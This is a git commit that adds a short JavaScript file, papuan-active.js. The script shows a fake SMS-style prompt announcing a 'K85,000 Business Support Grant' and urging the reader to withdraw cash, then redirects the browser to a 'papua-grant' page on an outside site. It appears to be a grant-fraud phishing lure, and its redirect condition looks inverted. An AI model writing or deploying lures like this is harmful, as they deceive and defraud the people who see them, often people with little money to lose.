4634306618bc88e8b9f4b093f054670057a68d69
sureconnect001 <ukpe247@gmail.com>
2025-05-25 08:42:36 +0100

    Create papuan-active.js

---
+++ papuan-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW K85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive K85,000 Business Support Grant from Noreo Beangke, Press Ok to withdraw cash Now ','WITHDRAW K85,000');
+if (password != 'WITHDRAW K85,000') {
+location.href='https://sure-connect.org/papua-grant.html';
+}
